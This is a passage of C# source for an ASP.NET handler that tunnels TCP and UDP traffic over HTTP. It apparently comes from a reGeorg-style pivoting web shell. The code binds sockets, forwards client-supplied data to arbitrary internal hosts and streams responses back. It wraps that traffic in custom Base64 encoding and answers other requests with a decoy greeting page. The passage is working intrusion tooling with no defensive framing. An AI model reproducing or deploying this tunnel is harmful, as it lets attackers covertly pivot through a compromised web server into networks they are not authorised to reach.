                    relay.Bind(new IPEndPoint(ip, port));
                    relay.Blocking = false;
                    TunnelState state = new TunnelState();
                    ConfigureState(state, info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                    state.Socket = relay;
                    SetState(context.Application, mark, state);
                    rinfo[STATUS] = "OK";
                    rinfo[IP] = ((IPEndPoint)relay.LocalEndPoint).Address.ToString();
                    rinfo[PORT] = ((IPEndPoint)relay.LocalEndPoint).Port.ToString();
                } catch (Exception ex) {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = ex.Message;
                }
            } else if (cmd == "CHECK") {
                rinfo[STATUS] = "OK";
                TunnelState state = GetState(context.Application, mark);
                if (state != null) {
                    lock (state.Sync) {
                        if (state.Socket != null && state.Socket.Connected) {
                            IPEndPoint remote = state.Socket.RemoteEndPoint as IPEndPoint;
                            if (remote != null) {
                                rinfo[IP] = remote.Address.ToString();
                                rinfo[PORT] = remote.Port.ToString();
                            }
                        }
                    }
                }
            } else if (cmd == "DISCONNECT") {
                RemoveState(context.Application, mark);
                rinfo[STATUS] = "OK";
            } else {
                TunnelState state = GetState(context.Application, mark);
                if (state == null || state.Closed) {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = "Session is closed";
                } else if (cmd == "SHUT_WR") {
                    try {
                        if (!state.HalfCloseMode) throw new InvalidOperationException("Half-close mode is disabled");
                        lock (state.WriteSync) {
                            if (!state.LocalWriteClosed) {
                                state.Socket.Shutdown(SocketShutdown.Send);
                                state.LocalWriteClosed = true;
                            }
                        }
                        rinfo[STATUS] = "OK";
                    } catch (Exception ex) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = ex.Message;
                    }
                } else if (cmd == "DOWNLINK") {
                    String streamCompression = state != null ? state.ServerCompression : CompressionSetting(info, SERVERCOMPOPT, "optimal");
                    int streamLimit = state != null ? state.ServerOptimalLimit : IntSetting(info, SERVERLIMITOPT, 1024);
                    context.Response.Clear();
                    context.Response.Buffer = false;
                    context.Response.BufferOutput = false;
                    context.Response.ContentType = "application/octet-stream";
                    context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
                    context.Response.Cache.SetNoStore();
                    context.Response.AddHeader("X-Accel-Buffering", "no");
                    DateTime lastHeartbeat = DateTime.UtcNow;
                    TimeSpan heartbeatInterval = TimeSpan.FromSeconds(5);
                    while (true) {
                        Object[] frameInfo = new Object[40];
                        int action = FillDownlinkFrame(frameInfo, state, DATA, CMD, STATUS, ERROR, IP, PORT, UDPFRAG);
                        if (action == 2) break;
                        if (Convert.ToString(frameInfo[CMD]) == "HEARTBEAT" && DateTime.UtcNow - lastHeartbeat < heartbeatInterval) {
                            Thread.Sleep(50);
                            continue;
                        }
                        WriteStreamFrame(context.Response, frameInfo, streamCompression, streamLimit, en, de);
                        if (Convert.ToString(frameInfo[CMD]) == "HEARTBEAT") {
                            lastHeartbeat = DateTime.UtcNow;
                        }
                        if (action == 1) break;
                        Thread.Sleep(50);
                    }
                    return;
                } else if (cmd == "FORWARD") {
                    try {
                        Socket s = state.Socket;
                        if (s == null) throw new InvalidOperationException("BIND is waiting for a peer");
                        if (s.ProtocolType == ProtocolType.Tcp) {
                            lock (state.WriteSync) {
                                if (state.LocalWriteClosed) throw new InvalidOperationException("Write side is closed");
                                SendAll(s, (byte[])info[DATA]);
                            }
                        } else {
                            String target = (String)info[IP];
                            int port = int.Parse((String)info[PORT]);
                            IPAddress ip;
                            if (!IPAddress.TryParse(target, out ip)) ip = Dns.GetHostEntry(target).AddressList[0];
                            IPEndPoint remote = new IPEndPoint(ip, port);
                            lock (state.WriteSync) {
                                state.LastUdpActivity = DateTime.UtcNow;
                                byte[] packetData = UdpReassembleFragment(state.UdpIn, (byte[])info[DATA], (byte[])info[UDPFRAG]);
                                if (packetData != null) {
                                    s.SendTo(packetData, remote);
                                }
                            }
                        }
                        rinfo[STATUS] = "OK";
                    } catch (Exception ex) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = ex.Message;
                    }
                } else if (cmd == "READ") {
                    try {
                        lock (state.ReadSync) {
                            Socket s = state.Socket;
                            if (s == null) throw new InvalidOperationException("BIND is waiting for a peer");
                            if (s.ProtocolType == ProtocolType.Tcp) {
                                byte[] readBuff = SessionBuffer(ref state.TcpReadBuffer, Math.Min(state.ReadBuf, state.MaxReadSize));
                                byte[] readData = SessionBuffer(ref state.TcpAccumBuffer, state.MaxReadSize);
                                int readLen = 0;
                                int c = -1;
                                try {
                                    while (readLen < state.MaxReadSize) {
                                        int remaining = state.MaxReadSize - readLen;
                                        c = BeginReceiveReady(s, readBuff, 0, Math.Min(readBuff.Length, remaining));
                                        if (c <= 0) break;
                                        System.Buffer.BlockCopy(readBuff, 0, readData, readLen, c);
                                        readLen += c;
                                        if (c < Math.Min(readBuff.Length, remaining)) break;
                                    }
                                } catch (SocketException ex) {
                                    if (!IsWouldBlock(ex)) throw;
                                }
                                if (readLen > 0) {
                                    byte[] newBuff = new byte[readLen];
                                    System.Buffer.BlockCopy(readData, 0, newBuff, 0, readLen);
                                    rinfo[DATA] = newBuff;
                                }
                                rinfo[STATUS] = "OK";
                                if (c == 0) {
                                    state.RemoteWriteClosed = true;
                                    if (state.HalfCloseMode) rinfo[CMD] = "SHUT_WR";
                                    else if (readLen == 0) {
                                        rinfo[STATUS] = "FAIL";
                                        rinfo[ERROR] = "Session is closed";
                                    }
                                }
                            } else {
                                if ((DateTime.UtcNow - state.LastUdpActivity).TotalSeconds > state.UdpIdleTimeout) {
                                    RemoveState(context.Application, mark);
                                    rinfo[STATUS] = "FAIL";
                                    rinfo[ERROR] = "Session is closed";
                                } else {
                                byte[] readBuff = new byte[65497];
                                if (state.UdpOut.Count == 0) {
                                    try {
                                        EndPoint remote = new IPEndPoint(IPAddress.Any, 0);
                                        int count = s.ReceiveFrom(readBuff, ref remote);
                                        if (count > 0) {
                                            state.LastUdpActivity = DateTime.UtcNow;
                                            byte[] packet = new byte[count];
                                            System.Buffer.BlockCopy(readBuff, 0, packet, 0, count);
                                            foreach (Object[] fragment in UdpFragmentPayload(packet, state.UdpFragSize))
                                                state.UdpOut.Enqueue(new Object[]{fragment, remote});
                                        }
                                    } catch (SocketException ex) {
                                        if (!IsWouldBlock(ex)) throw;
                                    }
                                }
                                if (state.UdpOut.Count > 0) {
                                    Object[] packet = state.UdpOut.Dequeue();
                                    Object[] fragment = (Object[])packet[0];
                                    IPEndPoint remote = (IPEndPoint)packet[1];
                                    if (fragment[0] != null) rinfo[UDPFRAG] = (byte[])fragment[0];
                                    rinfo[IP] = remote.Address.ToString();
                                    rinfo[PORT] = remote.Port.ToString();
                                    rinfo[DATA] = (byte[])fragment[1];
                                }
                                rinfo[STATUS] = "OK";
                                }
                            }
                        }
                    } catch (Exception ex) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = ex.Message;
                    }
                }
            }
            TunnelState responseState = GetState(context.Application, mark);
            String responseCompression = responseState != null ? responseState.ServerCompression : CompressionSetting(info, SERVERCOMPOPT, "optimal");
            int responseLimit = responseState != null ? responseState.ServerOptimalLimit : IntSetting(info, SERVERLIMITOPT, 1024);
            context.Response.Write(Base64EncodeMapped(blv_encode(rinfo, responseCompression, responseLimit)));
        } else {
            context.Response.Write(Encoding.Default.GetString(Base64DecodeMapped(rogerHello)));
        }
    }

    public bool IsReusable {
        get {
            return false;
        }
    }
}
